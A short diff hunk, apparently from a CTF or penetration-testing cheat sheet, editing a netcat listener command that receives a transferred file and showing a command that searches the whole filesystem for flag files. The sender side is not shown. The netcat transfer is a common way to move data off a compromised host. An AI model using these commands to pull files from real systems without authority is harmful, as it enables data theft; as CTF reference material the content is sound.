@@ -1360,7 +1360,7 @@ find / -type f -iname '*.flag' -exec echo{} \; -exec cat {} \; 2>/dev/null
 
 ### On Server (Receiver)
 ```
-nc -lv -p 1337 -q 1 > {LOCAL_FILE} < /dev/null
+nc -lv -p 1337 > {LOCAL_FILE} < /dev/null
 ```
 
 ### On Client (Sender)
